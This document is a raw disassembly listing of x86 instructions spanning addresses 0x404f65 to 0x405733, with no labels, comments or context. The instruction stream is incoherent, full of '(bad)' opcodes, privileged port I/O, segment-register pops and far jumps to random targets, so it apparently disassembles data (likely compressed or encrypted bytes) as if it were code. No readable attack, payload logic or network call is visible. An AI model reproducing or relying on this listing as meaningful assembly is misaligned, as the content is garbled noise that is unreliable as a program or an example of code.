  404f65:	adc    esi,DWORD PTR [eax+0x3]
  404f68:	dec    ebp
  404f69:	dec    esi
  404f6a:	jl     0x404f4b
  404f6c:	jns    0x404efe
  404f6e:	sub    eax,0x26fc5de9
  404f73:	sbb    BYTE PTR [edi],al
  404f75:	push   es
  404f76:	in     al,dx
  404f77:	fldcw  WORD PTR [ecx]
  404f79:	mov    eax,ds:0x846d3a84
  404f7e:	adc    ecx,DWORD PTR [eax+0x4b091e36]
  404f84:	adc    eax,edx
  404f86:	pop    ecx
  404f87:	xchg   esi,eax
  404f88:	loopne 0x404f14
  404f8a:	fst    QWORD PTR [edx+0x1]
  404f8d:	mov    eax,ds:0x711bdc1d
  404f92:	gs mov eax,0x8651a309
  404f98:	fcmovnbe st,st(5)
  404f9a:	adc    BYTE PTR [edx],dl
  404f9c:	das    
  404f9d:	(bad)  
  404f9e:	retf   
  404f9f:	scas   ax,WORD PTR es:[edi]
  404fa1:	and    cl,BYTE PTR [edi]
  404fa3:	mov    dh,0x74
  404fa5:	dec    eax
  404fa6:	jg     0x404fbf
  404fa8:	fistp  DWORD PTR [edi]
  404faa:	adc    eax,0xfd823c4b
  404faf:	and    dh,BYTE PTR [esi+eiz*2+0x4]
  404fb3:	add    eax,0xcbff97ab
  404fb8:	je     0x40501b
  404fba:	sbb    dh,BYTE PTR [esi+ecx*1-0x15]
  404fbe:	bound  eax,QWORD PTR [ebx+0x77461e8]
  404fc4:	pop    es
  404fc5:	je     0x40502e
  404fc7:	push   0x46b746a6
  404fcc:	enter  0x755e,0x50
  404fd0:	xor    eax,0xecf5dd73
  404fd5:	add    al,0xfa
  404fd7:	dec    ebp
  404fd8:	pop    eax
  404fd9:	enter  0x2c16,0xba
  404fdd:	inc    esp
  404fde:	and    edi,ecx
  404fe0:	pop    ss
  404fe1:	repnz adc eax,0x48ba1603
  404fe7:	add    al,0xde
  404fe9:	outs   dx,BYTE PTR ds:[esi]
  404fea:	cmp    dh,BYTE PTR gs:[ebp+0x1d]
  404fee:	jl     0x404fb3
  404ff0:	pop    ss
  404ff1:	mov    ch,BYTE PTR [esp+esi*1-0x5f8577ff]
  404ff8:	pop    esp
  404ff9:	fild   DWORD PTR [edi+edi*8]
  404ffc:	sbb    DWORD PTR [esp+ebp*4],ebx
  404fff:	dec    edx
  405000:	add    DWORD PTR [edi-0x74caf913],esi
  405006:	jge    0x404ff2
  405008:	push   0x6615dbe1
  40500d:	aas    
  40500e:	mov    edx,0x6c80bc5
  405013:	mov    di,0xeb28
  405017:	or     al,BYTE PTR [esi+esi*2]
  40501a:	add    al,0xa
  40501c:	adc    DWORD PTR [edi],edi
  40501e:	cs out dx,eax
  405020:	or     al,0x9d
  405022:	jle    0x40502b
  405024:	jo     0x405087
  405026:	or     DWORD PTR [edi],esp
  405028:	cmp    al,0x8c
  40502a:	mov    edi,eax
  40502c:	mov    BYTE PTR [edx],dl
  40502e:	cmp    DWORD PTR [eax],ecx
  405030:	pusha  
  405031:	sub    ebp,DWORD PTR [edi]
  405033:	mov    ch,BYTE PTR [edx]
  405035:	or     DWORD PTR [eax*4+0x790e630],0x578653
  405040:	test   eax,0x48374898
  405045:	push   es
  405046:	pushf  
  405047:	gs add edx,edi
  40504a:	add    BYTE PTR [edx-0x37],dh
  40504d:	add    esp,esp
  40504f:	shl    BYTE PTR [ebx-0x30],1
  405052:	add    eax,DWORD PTR [ebx+eax*2]
  405055:	dec    eax
  405056:	lods   eax,DWORD PTR ds:[esi]
  405057:	je     0x4050ce
  405059:	sub    DWORD PTR [edx],edi
  40505b:	inc    ebp
  40505c:	fcmovnu st,st(0)
  40505e:	mov    ecx,0x83ff0cea
  405063:	adc    dl,BYTE PTR [eax+0x76]
  405066:	clc    
  405067:	imul   esi,DWORD PTR [esi-0x60],0x1f
  40506b:	lods   al,BYTE PTR ds:[esi]
  40506c:	add    DWORD PTR [esi],0x4
  40506f:	push   0x2b61724b
  405074:	and    DWORD PTR [ebp+0x2584023e],ebx
  40507a:	pop    ss
  40507b:	xor    al,BYTE PTR [ecx]
  40507d:	add    al,dh
  40507f:	(bad)  
  405080:	fdiv   DWORD PTR [ecx+0x733e3303]
  405086:	adc    esp,ebp
  405088:	nop
  405089:	in     eax,0x6c
  40508b:	dec    ecx
  40508c:	(bad)  
  40508d:	dec    esi
  40508e:	jmp    0x40509f
  405090:	adc    BYTE PTR [eax+ecx*2+0x200d2503],dl
  405097:	xchg   edi,eax
  405098:	push   eax
  405099:	xor    DWORD PTR [edi+0x39],edx
  40509c:	jae    0x40503f
  40509e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40509f:	sbb    cl,BYTE PTR [edx+0x46]
  4050a2:	pop    eax
  4050a3:	pop    ebx
  4050a4:	shl    BYTE PTR [edx],cl
  4050a6:	in     al,0x3
  4050a8:	mov    dl,bl
  4050aa:	lds    esi,FWORD PTR [esi]
  4050ac:	dec    eax
  4050ad:	and    BYTE PTR [esi+0x24f7fb8e],0xa4
  4050b4:	nop
  4050b5:	jl     0x4050b7
  4050b7:	mov    eax,0xbd2dd282
  4050bc:	and    BYTE PTR [esi+0x61204f4],cl
  4050c2:	call   0xcd4792d5
  4050c7:	or     esp,esi
  4050c9:	jbe    0x40509d
  4050cb:	les    edi,FWORD PTR [eax+0x2300f5c]
  4050d1:	out    0x97,al
  4050d3:	dec    esi
  4050d4:	pop    es
  4050d5:	cmp    BYTE PTR ds:0xb9d21bd9,0x81
  4050dc:	adc    BYTE PTR [ebx*4-0x27377cf1],dh
  4050e3:	sbb    esp,DWORD PTR [di]
  4050e6:	mov    WORD PTR [ebx+edi*2+0x21],?
  4050ea:	mov    WORD PTR [edx-0x14a16e26],ss
  4050f0:	gs in  al,0xeb
  4050f3:	pop    ds
  4050f4:	push   es
  4050f5:	loopne 0x4050c1
  4050f7:	push   ecx
  4050f8:	xor    bl,BYTE PTR [eax]
  4050fa:	or     ecx,DWORD PTR [edi-0x5fd88fc0]
  405100:	lea    esp,[eax+0x25255380]
  405106:	stc    
  405107:	xchg   DWORD PTR [esi],ebp
  405109:	nop
  40510a:	shl    esp,1
  40510c:	mov    edx,DWORD PTR [esi]
  40510e:	sub    edx,DWORD PTR [ebp-0x24]
  405111:	fimul  WORD PTR [edx-0x48]
  405114:	popf   
  405115:	and    DWORD PTR [esi],edx
  405117:	sub    ch,bl
  405119:	adc    cl,BYTE PTR [esp+ebx*1]
  40511c:	xchg   esp,eax
  40511d:	js     0x405147
  40511f:	fwait
  405120:	xchg   esp,eax
  405121:	(bad)  
  405123:	dec    edi
  405124:	mov    BYTE PTR [ebx+0x6],al
  405127:	iret   
  405128:	dec    ecx
  405129:	mov    ds:0xd48535ca,al
  40512e:	adc    esp,DWORD PTR [ecx+0x2c1e241a]
  405134:	or     al,0xcf
  405136:	jmp    0x40518d
  405138:	mov    dh,0xe6
  40513a:	mov    BYTE PTR [edi],bh
  40513c:	inc    ecx
  40513d:	dec    ebp
  40513e:	das    
  40513f:	push   eax
  405140:	dec    ebp
  405141:	add    DWORD PTR [esi],eax
  405143:	add    ecx,DWORD PTR [ebp-0x60]
  405146:	cmp    BYTE PTR [ecx],0xf7
  405149:	or     cl,BYTE PTR [ebx]
  40514b:	add    BYTE PTR [edi],al
  40514d:	or     al,0x59
  405150:	mov    eax,0xbcf8df5d
  405155:	ja     0x405141
  405157:	mov    WORD PTR [edi],cs
  405159:	test   DWORD PTR [ebx+0x7],edi
  40515c:	adc    eax,0x5573613f
  405161:	xchg   ebp,eax
  405162:	and    al,bl
  405164:	cmp    ebp,ebx
  405166:	or     al,0x55
  405168:	mov    eax,0xb998b45e
  40516d:	mov    eax,0x24820d73
  405172:	sub    al,BYTE PTR [edx+0x6f]
  405175:	mov    DWORD PTR [eax],ecx
  405177:	lea    esi,[eax]
  405179:	push   0xcefb3566
  40517e:	push   ebp
  40517f:	or     BYTE PTR [edi+0x43],bl
  405182:	pop    ebx
  405183:	cmp    BYTE PTR [esi],al
  405185:	lock jbe 0x405195
  405188:	mov    ebx,0x1a5c751e
  40518d:	inc    edi
  40518e:	or     al,0xa0
  405190:	adc    DWORD PTR [edi+ebx*1],ecx
  405193:	loope  0x405168
  405195:	inc    ecx
  405196:	pop    ds
  405197:	and    edi,eax
  405199:	cmp    ebx,eax
  40519b:	jg     0x405185
  40519d:	je     0x40518c
  40519f:	mov    DWORD PTR [edi],ebx
  4051a1:	xor    DWORD PTR [ecx+0x74],ebx
  4051a4:	dec    eax
  4051a5:	fwait
  4051a6:	hlt    
  4051a7:	or     al,bh
  4051a9:	mov    esi,0xbbb0f0ce
  4051ae:	mul    DWORD PTR [esi-0x38f1533a]
  4051b4:	dec    esp
  4051b5:	int3   
  4051b6:	jno    0x405223
  4051b8:	jge    0x4051db
  4051ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051bb:	mov    ebx,DWORD PTR [ebx]
  4051bd:	xor    esi,esi
  4051bf:	ret    
  4051c0:	inc    ebp
  4051c1:	add    eax,eax
  4051c3:	aam    0x25
  4051c5:	mov    al,ds:0x5450c645
  4051ca:	pop    ds
  4051cb:	mov    dl,0xb5
  4051cd:	inc    esi
  4051ce:	das    
  4051cf:	out    dx,eax
  4051d0:	jmp    0xc75c:0x601f6630
  4051d7:	lahf   
  4051d8:	loopne 0x405249
  4051da:	pop    ds
  4051db:	adc    DWORD PTR [edx-0x2ffbe7bc],ecx
  4051e1:	sub    al,0xa
  4051e3:	jae    0x4051ec
  4051e5:	cmc    
  4051e6:	jb     0x4051b5
  4051e8:	cli    
  4051e9:	imul   esi,DWORD PTR [edi],0x51
  4051ec:	sub    DWORD PTR [eax],ebx
  4051ee:	jle    0x40520d
  4051f0:	xlat   BYTE PTR ds:[ebx]
  4051f1:	dec    esi
  4051f2:	adc    ch,BYTE PTR [edx]
  4051f4:	ret    0x7407
  4051f7:	push   ebp
  4051f8:	fwait
  4051f9:	ror    DWORD PTR [eax+0x2d182302],cl
  4051ff:	dec    ecx
  405200:	mov    ah,0x1
  405202:	outs   dx,BYTE PTR ds:[esi]
  405203:	mov    DWORD PTR [eax],esi
  405205:	outs   dx,DWORD PTR ds:[esi]
  405206:	jbe    0x4051ff
  405208:	fild   DWORD PTR [ecx+eiz*1]
  40520b:	sub    esp,DWORD PTR [edx-0x49]
  40520e:	or     esi,edx
  405210:	and    al,0xaa
  405212:	in     al,0x97
  405214:	add    DWORD PTR [edi+0x17dcc419],eax
  40521a:	push   ecx
  40521b:	dec    esp
  40521c:	(bad)  
  40521d:	dec    eax
  40521e:	mov    eax,ds:0x1cc1475
  405223:	retf   0x8d85
  405226:	push   ss
  405227:	shl    DWORD PTR [ebx+0x74],0xe8
  40522b:	push   ss
  40522c:	mov    DWORD PTR [ebp+0x3583e215],edx
  405232:	pop    esi
  405233:	push   eax
  405234:	mov    ebp,0xb3060120
  405239:	add    esp,esp
  40523b:	and    BYTE PTR [edi],cl
  40523d:	sub    esp,DWORD PTR [edx-0x17d478f8]
  405243:	mov    al,ds:0x8f8c008e
  405248:	push   ecx
  405249:	mov    BYTE PTR [ebx+edx*1-0xf13c130],bh
  405250:	jae    0x40523d
  405252:	outs   dx,BYTE PTR ds:[esi]
  405253:	fild   DWORD PTR [esi-0x2f]
  405256:	and    DWORD PTR [ebp+0x7],ecx
  405259:	pop    esi
  40525a:	pop    es
  40525b:	repnz push es
  40525d:	inc    esp
  40525e:	icebp  
  40525f:	push   edx
  405260:	sar    edi,1
  405262:	cmp    al,BYTE PTR [eax+0x4]
  405265:	inc    DWORD PTR [edi]
  405267:	inc    ecx
  405268:	xchg   edi,eax
  405269:	and    al,0xc0
  40526b:	pop    eax
  40526c:	sti    
  40526d:	xor    DWORD PTR [edi+0x5f6c5bff],edi
  405273:	pusha  
  405274:	sub    DWORD PTR [edx],esp
  405276:	ds hlt 
  405278:	fild   QWORD PTR [esp+eax*2]
  40527b:	je     0x405297
  40527d:	dec    al
  40527f:	je     0x40528b
  405281:	sbb    ebx,DWORD PTR [ebx]
  405283:	sub    eax,0x40832c82
  405288:	je     0x40520e
  40528a:	adc    BYTE PTR [ebp-0x4c08a5cb],bh
  405290:	add    ch,bl
  405292:	sbb    al,BYTE PTR [ebx]
  405294:	push   ss
  405295:	sub    BYTE PTR [eax+0x470eeb3b],dl
  40529b:	jo     0x405292
  40529d:	fadd   QWORD PTR [edi-0x338107a8]
  4052a3:	outs   dx,BYTE PTR ds:[esi]
  4052a4:	xchg   ebx,edi
  4052a6:	and    DWORD PTR [ebp-0x14d131d3],edi
  4052ac:	mov    ds:0xac006a03,eax
  4052b1:	jns    0x40529c
  4052b3:	cmp    eax,0x32138b0d
  4052b8:	add    dl,al
  4052ba:	mov    DWORD PTR [ebx],eax
  4052bc:	add    edi,DWORD PTR [edi]
  4052be:	inc    ebp
  4052bf:	and    ecx,esp
  4052c1:	add    edi,DWORD PTR ds:[esp+ecx*1+0x2d]
  4052c6:	mov    eax,esi
  4052c8:	jge    0x4052cf
  4052ca:	cmp    al,0x9
  4052cc:	repz push ecx
  4052ce:	mov    ebp,eax
  4052d0:	xchg   DWORD PTR [edi+0xfaedca0],edi
  4052d6:	push   ecx
  4052d7:	mov    ebx,0x64be6a48
  4052dc:	add    al,0xb1
  4052de:	adc    ecx,DWORD PTR [eax-0x74d6f445]
  4052e4:	lds    ebp,FWORD PTR [ebp+0x40070703]
  4052ea:	or     edi,DWORD PTR [edx+0x7292055a]
  4052f0:	or     BYTE PTR ss:[edx],cl
  4052f3:	add    DWORD PTR [ebx],edi
  4052f5:	xor    ebx,ebp
  4052f7:	or     DWORD PTR [esi],ebp
  4052f9:	add    esp,DWORD PTR [ecx+0x2]
  4052fc:	fisubr WORD PTR [edi]
  4052fe:	dec    edi
  4052ff:	jne    0x4052d3
  405301:	xchg   esi,eax
  405302:	push   eax
  405303:	int    0x56
  405305:	rol    DWORD PTR [eax+0x123c5533],0x81
  40530c:	or     DWORD PTR [esi-0x7cc58a02],ebx
  405312:	sti    
  405313:	arpl   WORD PTR [edi+0x24],di
  405316:	dec    esi
  405317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405318:	xor    ah,bh
  40531a:	push   ss
  40531b:	cld    
  40531c:	pop    ds
  40531d:	jae    0x4052b8
  40531f:	xor    eax,edx
  405321:	sub    eax,edx
  405323:	add    ecx,eax
  405325:	and    DWORD PTR [eax+eax*1-0x23],0x6bfa3f42
  40532d:	shl    BYTE PTR [ebx+eax*1-0x28],0xb5
  405332:	js     0x405330
  405334:	sahf   
  405335:	push   cs
  405336:	or     bh,dh
  405338:	push   es
  405339:	cmp    al,0xfb
  40533b:	hlt    
  40533c:	pop    eax
  40533d:	cld    
  40533e:	jmp    0x405346
  405340:	jb     0x40538a
  405342:	cld    
  405343:	xor    al,BYTE PTR [ebx]
  405345:	ret    
  405346:	outs   dx,DWORD PTR ds:[esi]
  405347:	sub    al,0xdb
  405349:	pusha  
  40534a:	dec    esp
  40534b:	fadd   DWORD PTR [edi]
  40534d:	fadd   DWORD PTR [edx]
  40534f:	fsubr  st(0),st
  405351:	in     al,0xc7
  405353:	shl    DWORD PTR [ecx+0x100fa9e4],0xab
  40535a:	mov    ebp,DWORD PTR [esi]
  40535c:	fsub   DWORD PTR [eax-0x11a2716f]
  405362:	jb     0x4052f3
  405364:	push   esi
  405365:	ret    
  405366:	push   eax
  405367:	mov    al,ds:0xa9c8ad54
  40536c:	xchg   esi,eax
  40536d:	js     0x4053c7
  40536f:	iret   
  405370:	ja     0x4053ba
  405372:	js     0x40536a
  405374:	and    DWORD PTR [ebp-0x56250928],esp
  40537a:	adc    ch,ah
  40537c:	ds sbb dh,al
  40537f:	sbb    eax,0x67e084f0
  405384:	jne    0x4053ba
  405386:	dec    eax
  405387:	ja     0x40531d
  405389:	mov    edi,0x9c66d48b
  40538e:	ror    DWORD PTR [ebx],0x49
  405391:	pop    ss
  405392:	mov    BYTE PTR [eax+0x12],0xaf
  405396:	adc    BYTE PTR [esp+ebp*1-0x62],bh
  40539a:	in     al,0x41
  40539c:	nop
  40539d:	and    eax,0xdfb83c25
  4053a2:	mov    ebx,0x1ceb44dc
  4053a7:	mov    edx,DWORD PTR ds:0x7fc4b83e
  4053ad:	and    eax,0xe1d4f80c
  4053b2:	inc    edx
  4053b3:	cwde   
  4053b4:	or     BYTE PTR [ecx-0x14ba55b8],ah
  4053ba:	add    eax,0x732db078
  4053bf:	hlt    
  4053c0:	push   esi
  4053c1:	jne    0x4053b3
  4053c3:	test   BYTE PTR [edi-0x51914263],bh
  4053c9:	xor    DWORD PTR [edi],esi
  4053cb:	adc    BYTE PTR [edx+0x106dfb0d],cl
  4053d1:	or     DWORD PTR [ecx+0x36],ebp
  4053d4:	repz push ss
  4053d6:	sbb    ch,BYTE PTR [esi]
  4053d8:	jmp    0x290:0x2f3cd2f2
  4053df:	into   
  4053e0:	add    cl,ch
  4053e2:	lock ins BYTE PTR es:[edi],dx
  4053e4:	mov    esp,0xb1d31375
  4053e9:	mov    ah,al
  4053eb:	sub    al,0x1
  4053ed:	jb     0x405448
  4053ef:	and    ch,BYTE PTR [esi+0x5b]
  4053f2:	pop    ss
  4053f3:	ja     0x405456
  4053f5:	cmp    ch,bl
  4053f7:	push   edx
  4053f8:	push   esi
  4053f9:	lock adc ch,cl
  4053fc:	imul   al
  4053fe:	data16 add dh,cl
  405401:	add    BYTE PTR [esi+0x64071ed9],al
  405407:	nop
  405408:	or     ebx,edi
  40540a:	xor    ebx,ebp
  40540c:	ss sbb esi,edx
  40540f:	hlt    
  405410:	out    0x42,eax
  405412:	xchg   esi,eax
  405413:	data16 sbb dh,ah
  405416:	jmp    0x405408
  405418:	popf   
  405419:	mov    eax,DWORD PTR [edi+0x55aefa02]
  40541f:	jg     0x405498
  405421:	js     0x4053b0
  405423:	pop    edx
  405424:	sub    al,0xd5
  405426:	xor    BYTE PTR [ecx-0x7],bl
  405429:	jo     0x4053e3
  40542b:	xor    ecx,ebx
  40542d:	test   al,0x18
  40542f:	ret    0x6a77
  405432:	out    dx,eax
  405433:	dec    ecx
  405434:	rcr    BYTE PTR [edx],1
  405436:	or     al,0xa1
  405438:	popa   
  405439:	sub    ebp,ebx
  40543b:	push   ecx
  40543c:	in     al,dx
  40543d:	inc    eax
  40543e:	mov    edi,0xee19688d
  405443:	and    eax,0x1b3df1
  405448:	jbe    0x4054a4
  40544a:	in     al,dx
  40544b:	fstp   TBYTE PTR [ebx-0x37c4bfc4]
  405451:	jle    0x405488
  405453:	adc    bh,al
  405455:	fs jmp 0x405487
  405458:	cmp    cl,BYTE PTR [ecx+0x61]
  40545b:	ret    
  40545c:	mov    dh,0xd8
  40545e:	inc    edi
  40545f:	neg    BYTE PTR [edx+0x12]
  405462:	test   DWORD PTR [ecx+0x21],edi
  405465:	popa   
  405466:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  405468:	pop    ds
  405469:	mov    ebx,0x706e4613
  40546e:	or     BYTE PTR [esp+ecx*8],al
  405471:	fs inc esp
  405473:	pop    es
  405474:	mov    bl,0x9
  405476:	sahf   
  405477:	pushf  
  405478:	jo     0x405415
  40547a:	shl    BYTE PTR [eax],1
  40547c:	les    edi,FWORD PTR [edi]
  40547e:	aam    0x20
  405480:	push   ss
  405481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405482:	fwait
  405483:	mov    ch,0x1a
  405485:	shl    BYTE PTR [esi+0x12118c24],cl
  40548b:	hlt    
  40548c:	repz jnp 0x405505
  40548f:	cmp    bl,BYTE PTR [ebp+0x16]
  405492:	sub    BYTE PTR [edi],dl
  405494:	or     DWORD PTR [ebx],esp
  405496:	push   es
  405497:	jne    0x405483
  405499:	mov    DWORD PTR [ebp+0x1c6092cb],eax
  40549f:	push   esp
  4054a0:	sbb    ah,0xff
  4054a3:	pop    edi
  4054a4:	xchg   ebx,eax
  4054a5:	bound  esp,QWORD PTR ds:0xdc6c816d
  4054ab:	sub    al,0xdb
  4054ad:	scas   eax,DWORD PTR es:[edi]
  4054ae:	popa   
  4054af:	pop    ss
  4054b0:	outs   dx,DWORD PTR ds:[esi]
  4054b1:	je     0x4054dd
  4054b3:	sub    eax,ebx
  4054b5:	xchg   esp,eax
  4054b6:	lds    ebx,FWORD PTR [edx]
  4054b8:	ss sbb eax,0x6bb59917
  4054bf:	test   BYTE PTR [ebx-0x6b541e5],ch
  4054c5:	push   ebp
  4054c6:	out    dx,al
  4054c7:	pushf  
  4054c8:	or     al,0x16
  4054ca:	mov    fs,WORD PTR [ebp-0x87ec399]
  4054d0:	jl     0x405484
  4054d2:	mov    esp,DWORD PTR [ecx+eax*4]
  4054d5:	xchg   ecx,eax
  4054d6:	cld    
  4054d7:	fdivr  DWORD PTR [edx+0x282b3804]
  4054dd:	xchg   DWORD PTR [ebp+0x4f],eax
  4054e0:	add    eax,DWORD PTR gs:[esi+0x6406d545]
  4054e7:	add    BYTE PTR [ebx],bh
  4054e9:	add    edi,DWORD PTR [edi]
  4054eb:	inc    eax
  4054ec:	mov    ecx,0xcf83eac2
  4054f1:	push   DWORD PTR ds:0x5e91c11b
  4054f7:	or     eax,0x8476eea7
  4054fc:	ficom  WORD PTR [edx]
  4054fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054ff:	xchg   ebx,eax
  405500:	mov    ecx,0xb8b9126e
  405505:	and    BYTE PTR [ecx],dl
  405507:	je     0x40550d
  405509:	dec    edi
  40550a:	adc    esi,DWORD PTR [edx]
  40550c:	and    eax,0x282aebdf
  405511:	xchg   esp,eax
  405512:	les    eax,FWORD PTR ds:0x47340b9a
  405518:	scas   eax,DWORD PTR es:[edi]
  405519:	add    BYTE PTR [esp+edi*2+0x46d1c509],cl
  405520:	aam    0x4
  405522:	mov    esi,DWORD PTR [eax+0x50]
  405525:	jmp    0x4b980843
  40552a:	adc    DWORD PTR [ebx+0x2b9c0145],esp
  405530:	daa    
  405531:	fistp  DWORD PTR [bp+si]
  405534:	push   es
  405535:	push   es
  405536:	or     BYTE PTR [edx],cl
  405538:	gs ret 
  40553a:	jle    0x405548
  40553c:	jns    0x4054c8
  40553e:	or     eax,0x7474e78c
  405543:	inc    ecx
  405544:	jb     0x4054c6
  405546:	popf   
  405547:	nop
  405548:	or     al,BYTE PTR [ebx]
  40554a:	add    DWORD PTR [edi+eax*2],ebp
  40554d:	in     al,0xe4
  40554f:	test   BYTE PTR [esp+ecx*1],bl
  405552:	(bad)  
  405553:	add    BYTE PTR [edi-0x65],bh
  405556:	nop
  405557:	inc    ebx
  405558:	sbb    cl,BYTE PTR es:[esi]
  40555b:	test   eax,0x2105eac2
  405560:	sbb    al,0x7d
  405562:	push   ebx
  405563:	sbb    DWORD PTR [esi+eiz*2],esp
  405566:	sahf   
  405567:	cmp    al,0xf6
  405569:	add    esi,DWORD PTR [ecx+0x74]
  40556c:	inc    esi
  40556d:	pop    es
  40556e:	or     al,0x77
  405570:	ds jne 0x40557a
  405573:	dec    eax
  405574:	sub    BYTE PTR [ebx+0x1e],0x7
  405578:	add    al,0x1
  40557a:	push   cs
  40557b:	cmp    eax,0xd0cb5c39
  405580:	add    dl,BYTE PTR ds:0xae111986
  405586:	jp     0x405535
  405588:	test   eax,0xad5402a8
  40558d:	adc    al,0x66
  40558f:	inc    ecx
  405590:	test   al,0x32
  405592:	shl    DWORD PTR [esi+0x34],1
  405595:	(bad)  
  405596:	push   esp
  405597:	inc    edx
  405598:	mov    eax,0x6f430598
  40559d:	inc    edi
  40559e:	pushf  
  40559f:	inc    ebp
  4055a0:	mov    esp,0xc7af7948
  4055a5:	mov    bl,0x88
  4055a7:	mov    cl,0xa
  4055a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055aa:	leave  
  4055ab:	into   
  4055ac:	mov    eax,0xdd78f6d4
  4055b1:	jnp    0x405583
  4055b3:	xchg   ebp,eax
  4055b4:	or     al,0xa
  4055b6:	leave  
  4055b7:	sbb    al,0x7c
  4055b9:	mov    dh,0x60
  4055bb:	jo     0x4055bf
  4055bd:	es pop edx
  4055bf:	scas   eax,DWORD PTR es:[edi]
  4055c0:	push   esi
  4055c1:	call   0xf470606
  4055c6:	out    0x87,al
  4055c8:	cmp    BYTE PTR [edi+0x18],dh
  4055cb:	sub    ecx,edx
  4055cd:	das    
  4055ce:	inc    esi
  4055cf:	adc    al,0xcc
  4055d1:	inc    esp
  4055d2:	outs   dx,BYTE PTR ds:[esi]
  4055d3:	xchg   edx,eax
  4055d4:	fwait
  4055d5:	dec    ebp
  4055d6:	(bad)  
  4055d7:	js     0x405565
  4055d9:	sbb    eax,0x1c1ec68b
  4055de:	pop    es
  4055df:	mov    DWORD PTR [edi-0x70],ebx
  4055e2:	adc    BYTE PTR [ecx+0x75],ah
  4055e5:	or     eax,0xd9c47d25
  4055ea:	and    cl,BYTE PTR [edi+ebp*2]
  4055ed:	sub    bl,0x27
  4055f0:	fucomp st(2)
  4055f2:	xor    ecx,DWORD PTR [esi-0x82209ce]
  4055f8:	jb     0x405607
  4055fa:	push   cs
  4055fb:	fcom   QWORD PTR [ebp-0x23]
  4055fe:	pop    ds
  4055ff:	fwait
  405600:	jmp    0x40560d
  405602:	or     al,0x64
  405604:	push   0xffffff93
  405606:	mov    BYTE PTR [edi],ch
  405608:	aam    0x18
  40560a:	or     bh,BYTE PTR [edi+0x1458f10e]
  405610:	and    eax,0x6adaee
  405615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405616:	loop   0x4055f3
  405618:	mov    edx,0xb52b6a2
  40561d:	push   eax
  40561e:	push   cs
  40561f:	xor    cl,BYTE PTR [ebp-0x2c]
  405622:	bound  ebp,QWORD PTR [ebp+esi*1+0xe0cd24c]
  405629:	fdivr  DWORD PTR [esi-0x77]
  40562c:	push   ss
  40562d:	xchg   DWORD PTR [ebp-0x80],esi
  405630:	jmp    0x730d:0x4f27221
  405637:	adc    edx,ebx
  405639:	mov    ch,0xd2
  40563b:	xchg   bl,cl
  40563d:	xchg   ecx,eax
  40563e:	sbb    eax,0x2cc43841
  405643:	push   es
  405644:	xor    BYTE PTR [edi-0x4c3ea9b3],0x5f
  40564b:	cmp    al,0x5d
  40564d:	or     BYTE PTR [eax-0x73],dl
  405650:	add    bl,bh
  405652:	inc    edx
  405653:	test   eax,ebp
  405655:	push   ds
  405656:	inc    ebx
  405657:	test   BYTE PTR [edi+0x12],al
  40565a:	shl    DWORD PTR [ebx-0x75],0x6
  40565e:	adc    ebp,DWORD PTR [edx-0x52]
  405661:	in     al,dx
  405662:	mov    al,0x92
  405664:	inc    esp
  405665:	das    
  405666:	mov    ds:0x800f2dd6,al
  40566b:	and    edx,DWORD PTR [eax]
  40566d:	das    
  40566e:	or     ebx,DWORD PTR [ecx+0xf13026a]
  405674:	imul   esp,DWORD PTR [edi],0x48
  405677:	cmovo  eax,DWORD PTR ds:0x84c208a
  40567e:	add    BYTE PTR [edx+eax*1-0x4],0xc3
  405683:	sbb    esi,DWORD PTR [esi+eax*1+0x47]
  405687:	ror    DWORD PTR [edi+0x74],0x53
  40568b:	(bad)  
  40568c:	adc    BYTE PTR [ebp+0x11],cl
  40568f:	(bad)  
  405690:	ss xor ecx,ecx
  405693:	push   edx
  405694:	jle    0x405666
  405696:	retf   
  405697:	or     eax,0x141f5a28
  40569c:	pop    esp
  40569d:	mov    eax,0x1082f661
  4056a2:	sbb    al,0xcf
  4056a4:	mov    ch,0xaf
  4056a6:	es inc ebx
  4056a8:	jle    0x40569a
  4056aa:	ficom  WORD PTR [ecx+0x0]
  4056ad:	inc    edx
  4056ae:	jecxz  0x405647
  4056b0:	nop
  4056b1:	push   edi
  4056b2:	loope  0x405694
  4056b4:	adc    DWORD PTR [ecx-0x44774aa0],ebx
  4056ba:	cs jmp 0x5504:0xd0eda0be
  4056c2:	push   0xb
  4056c4:	pop    ss
  4056c5:	add    dl,BYTE PTR [edi]
  4056c7:	fwait
  4056c8:	int    0xb9
  4056ca:	pop    esp
  4056cb:	adc    BYTE PTR [edi-0x73],cl
  4056ce:	inc    ebx
  4056cf:	ja     0x4056f9
  4056d1:	rcr    ch,0x44
  4056d4:	dec    eax
  4056d5:	sub    DWORD PTR [edi+0x44],edi
  4056d8:	pop    ecx
  4056d9:	pop    edi
  4056da:	mov    ebx,eax
  4056dc:	xchg   edx,eax
  4056dd:	inc    ebx
  4056de:	xchg   esi,eax
  4056df:	xor    DWORD PTR [edx],esp
  4056e1:	lock mov WORD PTR [eax],?
  4056e4:	lahf   
  4056e5:	sub    BYTE PTR [ecx+edi*2],bl
  4056e8:	lock mov eax,edi
  4056eb:	inc    ebx
  4056ec:	xor    esi,0xffffffe0
  4056ef:	sti    
  4056f0:	or     eax,0xd9e6b9b4
  4056f5:	jne    0x4056a5
  4056f7:	pusha  
  4056f8:	add    BYTE PTR [edi],al
  4056fa:	sbb    al,0x4
  4056fc:	cs add eax,0x1828b5b2
  405702:	add    DWORD PTR [edi],0x4b
  405705:	push   es
  405706:	fwait
  405707:	mov    ah,BYTE PTR [esi]
  405709:	retf   
  40570a:	in     al,dx
  40570b:	mov    esp,0x9631c097
  405710:	cs leave 
  405712:	popa   
  405713:	jo     0x405701
  405715:	and    al,0xe8
  405717:	fsub   DWORD PTR [ebx]
  405719:	cmp    DWORD PTR [eax+eax*2+0x2a],ebp
  40571d:	jb     0x405707
  40571f:	mov    ch,0x3b
  405721:	daa    
  405722:	jmp    0x40572c
  405724:	jne    0x4056c2
  405726:	jmp    0x4056c6
  405728:	nop
  405729:	pop    ds
  40572a:	test   DWORD PTR [esi-0x18],eax
  40572d:	or     al,0x4a
  40572f:	and    BYTE PTR [eax-0x15],ch
  405732:	push   esi
  405733:	div    BYTE PTR [esi]
